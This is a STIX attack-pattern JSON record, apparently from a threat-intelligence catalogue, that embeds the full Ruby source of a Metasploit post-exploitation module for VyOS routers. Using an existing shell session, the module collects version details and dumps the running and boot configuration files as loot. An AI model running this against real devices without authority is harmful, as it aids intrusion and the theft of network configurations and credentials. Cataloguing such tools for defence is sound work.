{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--cb1dd84e-3037-4e89-8f0a-c875da1ca7f7",
    "created": "2024-08-14T16:33:17.991529Z",
    "modified": "2024-08-14T16:33:17.991533Z",
    "name": "VyOS Gather Device General Information",
    "description": " This module collects VyOS device information and configuration.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/networking/gather/enum_vyos.rb",
            "external_id": "enum_vyos.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Auxiliary::VYOS\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'VyOS Gather Device General Information',\n        'Description' => %q{\n          This module collects VyOS device information and configuration.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => ['h00die'],\n        'SessionTypes' => ['shell'],\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'SideEffects' => [IOC_IN_LOGS],\n          'Reliability' => []\n        }\n      )\n    )\n  end\n\n  def run\n    # Clear the screen\n    session.shell_command(\"\\n\")\n\n    # Get version info\n    print_status('Getting version information')\n    # 1.1.8, and prob before\n    version_out = session.shell_command('/opt/vyatta/bin/vyatta-show-version')\n    if version_out.include?('such file or directory')\n      # 1.3, and prob newer\n      version_out = session.shell_command('/usr/libexec/vyos/op_mode/show_version.py')\n    end\n\n    ver_loc = store_loot('vyos.version',\n                         'text/plain',\n                         session,\n                         version_out.strip,\n                         'version.txt',\n                         'VyOS Version')\n\n    # Print the version of VERBOSE set to true.\n    vprint_good(version_out)\n    vprint_good(\"Version information stored in to loot #{ver_loc}\")\n\n    # run additional information gathering\n    enum_configs\n  end\n\n  # run commands found in exec mode under privilege 1\n  def enum_configs\n    host = session.session_host\n    port = session.session_port\n    exec_commands = [\n      {\n        'cmd' => 'cat /config/config',\n        'fn' => 'get_running_config',\n        'desc' => 'Get Running Config on VyOS Device'\n      },\n      {\n        'cmd' => 'cat /config/config.boot',\n        'fn' => 'get_config',\n        'desc' => 'Get Boot Config on VyOS Device'\n      },\n    ]\n    exec_commands.each do |ec|\n      command = ec['cmd']\n      cmd_out = session.shell_command(command).gsub(command, '')\n      print_status(\"Gathering info from #{command}\")\n      vyos_config_eater(host, port, cmd_out.strip)\n    end\n  end\nend\n"
}